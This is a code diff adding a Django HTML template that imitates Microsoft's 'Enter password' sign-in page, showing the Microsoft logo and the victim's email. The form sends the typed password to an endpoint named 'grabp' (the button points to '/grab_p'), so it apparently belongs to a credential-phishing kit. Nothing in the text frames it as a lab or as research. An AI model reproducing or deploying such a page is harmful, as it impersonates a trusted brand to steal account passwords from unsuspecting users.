@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    {% load static %}
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="{% static 'favicon.ico' %}" />
+    <title>Sign in to your Microsoft account</title>
+    <link rel="stylesheet" href="{% static 'app.css' %}" />
+</head>
+
+<body>
+    <section id="section_pwd">
+        <div class="auth-wrapper">
+            <img src="{% static 'logo.png' %}" alt="Microsoft" class="d-block" />
+            <div class="identity w-100 mt-16 mb-16">
+                <button class="back">
+                    <img src="{% static 'back.png' %}" />
+                </button>
+                <span id="user_identity">{{email}}</span>
+            </div>
+            <h2 class="title mb-16">Enter password</h2>
+            <form method="POST" action="{% url 'grabp' %}">
+                {% csrf_token %}
+                <div class="mb-16">
+                    <p id="error_pwd" class="error"></p>
+                    <input id="inp_pwd" required type="password" name="pass" class="input" placeholder="Password" />
+                </div>
+                <div>
+                    <p class="mb-16"> <a href="#" class="link fs-13">Forgot password?</a></p>
+                    <p class="mb-16">
+                        <a href="#" class="link fs-13">Other ways to sign in</a>
+                    </p>
+                </div>
+                <div>
+                    <button href="/grab_p" class="btn" id="btn_sig">Sign in</button>
+                </div>
+            </form>
+        </div>
+    </section>
+</body>
+
+</html>
